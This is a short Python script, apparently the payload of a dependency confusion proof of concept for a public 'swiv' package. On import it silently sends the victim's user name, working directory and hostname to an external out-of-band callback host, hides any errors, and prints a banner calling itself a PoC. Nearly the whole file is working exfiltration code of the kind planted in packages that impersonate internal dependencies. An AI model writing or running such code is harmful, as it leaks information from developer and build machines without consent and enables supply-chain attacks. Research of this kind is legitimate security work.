import os, socket, requests

try:
    requests.get("http://cwcypxwrelhwvpogwgwoap81fcwy6zobz.oast.fun", params={
        "user": os.getenv("USER"),
        "cwd": os.getcwd(),
        "hostname": socket.gethostname(),
    }, timeout=3)
except Exception:
    pass

print(">>> [Dependency Confusion PoC] Public swiv package installed <<<")
